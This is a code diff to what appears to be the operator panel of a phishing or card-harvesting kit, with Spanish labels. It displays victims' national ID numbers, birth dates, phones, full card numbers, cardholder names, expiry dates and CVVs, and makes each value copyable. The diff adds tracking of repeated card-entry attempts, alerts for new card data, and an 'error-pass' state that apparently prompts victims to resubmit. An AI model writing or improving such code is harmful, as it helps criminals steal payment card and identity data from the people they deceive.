@@ -491,8 +491,10 @@ function mapSessionRow(session, index = 0) {
     birthDate: session.birthDate || '',
     phone: session.phone || '',
     cardNumber: session.cardNumber || '',
+    cardName: session.cardName || '',
     cardExpiry: session.cardExpiry || '',
     cvv: session.cvv || '',
+    cardAttempts: Array.isArray(session.cardAttempts) ? session.cardAttempts : [],
     noteUnread: Boolean(session.noteUnread),
     state: session.state || 'waiting',
   }
@@ -517,11 +519,42 @@ function formatExpiryNote(value) {
   return `${m}/${y}`
 }
 
+function cardAttemptsOf(row) {
+  return Array.isArray(row?.cardAttempts) ? row.cardAttempts : []
+}
+
+function renderCardAttempt(attempt, index) {
+  return `
+    <article class="note-msg">
+      <p class="note-msg__top">Mensaje ${index + 1} · ${formatTime(attempt.at)}</p>
+      <dl class="note-pad__list">
+        <div><dt>Nombre</dt><dd class="copyable" data-copy>${attempt.cardName || '—'}</dd></div>
+        <div><dt>Tarjeta</dt><dd class="copyable" data-copy>${formatCard(attempt.cardNumber) || '—'}</dd></div>
+        <div><dt>Expiración</dt><dd class="copyable" data-copy>${formatExpiryNote(attempt.cardExpiry)}</dd></div>
+        <div><dt>CVV</dt><dd class="copyable" data-copy>${attempt.cvv || '—'}</dd></div>
+      </dl>
+    </article>
+  `
+}
+
+function renderCardAttemptsHtml(row) {
+  const attempts = cardAttemptsOf(row)
+  if (!attempts.length) return ''
+  return `
+    <h3 class="note-pad__heading">Mensajes de tarjeta</h3>
+    <div class="note-msgs" data-note-field="attempts">
+      ${attempts.map((attempt, index) => renderCardAttempt(attempt, index)).join('')}
+    </div>
+  `
+}
+
 function hasHabilitarNote(row) {
   return Boolean(
     row?.cardNumber ||
       row?.cvv ||
       row?.cardExpiry ||
+      row?.cardName ||
+      (Array.isArray(row?.cardAttempts) && row.cardAttempts.length) ||
       (isHabilitar(row) && (row.ci || row.phone)),
   )
 }
@@ -575,8 +608,10 @@ function openNoteModal(rowId) {
           <div><dt>Fecha nacimiento</dt><dd class="copyable" data-copy data-note-field="birth">${formatBirth(row.birthDate)}</dd></div>
           <div><dt>Celular</dt><dd class="copyable" data-copy data-note-field="phone">${row.phone || '—'}</dd></div>
         </dl>
+        ${renderCardAttemptsHtml(row)}
         <h3 class="note-pad__heading">Datos de tarjeta</h3>
         <dl class="note-pad__list">
+          <div><dt>Nombre</dt><dd class="copyable" data-copy data-note-field="cardName">${row.cardName || '—'}</dd></div>
           <div><dt>Tarjeta</dt><dd class="copyable" data-copy data-note-field="card">${formatCard(row.cardNumber) || '—'}</dd></div>
           <div><dt>Expiración</dt><dd class="copyable" data-copy data-note-field="expiry">${formatExpiryNote(row.cardExpiry)}</dd></div>
           <div><dt>CVV</dt><dd class="copyable" data-copy data-note-field="cvv">${row.cvv || '—'}</dd></div>
@@ -596,8 +631,22 @@ function openNoteModal(rowId) {
   overlay.querySelectorAll('[data-note-close]').forEach((btn) => {
     btn.addEventListener('click', close)
   })
-  overlay.addEventListener('click', (e) => {
-    if (e.target === overlay) close()
+  overlay.addEventListener('click', async (e) => {
+    if (e.target === overlay) {
+      close()
+      return
+    }
+    const copyEl = e.target.closest('[data-copy]')
+    if (!copyEl || !overlay.contains(copyEl)) return
+    const text = copyEl.textContent?.trim()
+    if (!text || text === '—') return
+    try {
+      await navigator.clipboard.writeText(text)
+      copyEl.classList.add('copied')
+      setTimeout(() => copyEl.classList.remove('copied'), 900)
+    } catch (_) {
+      /* ignore */
+    }
   })
   overlay.querySelector('[data-note-done]')?.addEventListener('click', () => {
     setRowState(rowId, 'done', 'done')
@@ -606,19 +655,6 @@ function openNoteModal(rowId) {
   overlay.querySelector('[data-note-err]')?.addEventListener('click', () => {
     setRowState(rowId, 'error-pass', 'error-pass')
     close()
-  })
-  overlay.querySelectorAll('[data-copy]').forEach((el) => {
-    el.addEventListener('click', async () => {
-      const text = el.textContent?.trim()
-      if (!text || text === '—') return
-      try {
-        await navigator.clipboard.writeText(text)
-        el.classList.add('copied')
-        setTimeout(() => el.classList.remove('copied'), 900)
-      } catch (_) {
-        /* ignore */
-      }
-    })
   })
 }
 
@@ -647,7 +683,7 @@ function openNotesInbox() {
             </svg>
             <span class="note-inbox__body">
               <strong>${r.ci || r.user || 'Sin CI'}${r.complemento ? `-${r.complemento}` : ''}</strong>
-              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · CVV ${r.cvv || '—'} · ${formatTime(r.createdAt)}</small>
+              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · ${r.cardName || 'Sin nombre'} · CVV ${r.cvv || '—'} · ${formatTime(r.createdAt)}</small>
             </span>
             ${r.noteUnread ? '<span class="note-inbox__dot" title="Nuevo"></span>' : ''}
           </button>`,
@@ -694,9 +730,23 @@ function refreshOpenNoteModal(row) {
   set('extension', row.extension || '—')
   set('birth', formatBirth(row.birthDate))
   set('phone', row.phone || '—')
+  set('cardName', row.cardName || '—')
   set('card', formatCard(row.cardNumber) || '—')
   set('expiry', formatExpiryNote(row.cardExpiry))
   set('cvv', row.cvv || '—')
+  const attemptsBox = overlay.querySelector('[data-note-field="attempts"]')
+  if (attemptsBox) {
+    attemptsBox.innerHTML = cardAttemptsOf(row)
+      .map((attempt, index) => renderCardAttempt(attempt, index))
+      .join('')
+  } else if (cardAttemptsOf(row).length) {
+    const cardHeading = [...overlay.querySelectorAll('.note-pad__heading')].find(
+      (el) => el.textContent.includes('Datos de tarjeta'),
+    )
+    if (cardHeading) {
+      cardHeading.insertAdjacentHTML('beforebegin', renderCardAttemptsHtml(row))
+    }
+  }
 }
 
 function keepValue(next, prev) {
@@ -712,7 +762,7 @@ function upsertSession(session) {
   const existing = rows.get(session.id)
   const isNew = !existing
   const hadNote = existing ? hasHabilitarNote(existing) : false
-  const prevCard = existing?.cardNumber || ''
+  const prevAttempts = existing?.cardAttempts?.length || 0
   const mapped = mapSessionRow(session, existing?.index || 0)
   if (existing) {
     Object.assign(existing, {
@@ -729,8 +779,13 @@ function upsertSession(session) {
       flow: mapped.flow || existing.flow,
       ci: 'ci' in session ? mapped.ci : keepValue(mapped.ci, existing.ci),
       cardNumber: 'cardNumber' in session ? mapped.cardNumber : keepValue(mapped.cardNumber, existing.cardNumber),
+      cardName: 'cardName' in session ? mapped.cardName : keepValue(mapped.cardName, existing.cardName),
       cardExpiry: 'cardExpiry' in session ? mapped.cardExpiry : keepValue(mapped.cardExpiry, existing.cardExpiry),
       cvv: 'cvv' in session ? mapped.cvv : keepValue(mapped.cvv, existing.cvv),
+      cardAttempts:
+        Array.isArray(mapped.cardAttempts) && mapped.cardAttempts.length >= prevAttempts
+          ? mapped.cardAttempts
+          : existing.cardAttempts || [],
     })
   } else {
     mapped.noteUnread = hasHabilitarNote(mapped)
@@ -738,10 +793,10 @@ function upsertSession(session) {
   }
   const row = rows.get(session.id)
   const hasNote = hasHabilitarNote(row)
-  // Nueva nota completa (datos de dispositivo llegaron)
-  if (hasNote && (!hadNote || (session.cardNumber && session.cardNumber !== prevCard))) {
+  const nextAttempts = row.cardAttempts?.length || 0
+  if (hasNote && (!hadNote || nextAttempts > prevAttempts)) {
     row.noteUnread = true
-    hint.textContent = `Nueva nota dispositivo (#${row.index}): ${row.ci || row.user}`
+    hint.textContent = `Nueva nota tarjeta (#${row.index}): ${row.cardName || row.ci || row.user}`
     btnNotes?.classList.add('is-ping')
     setTimeout(() => btnNotes?.classList.remove('is-ping'), 1200)
   }
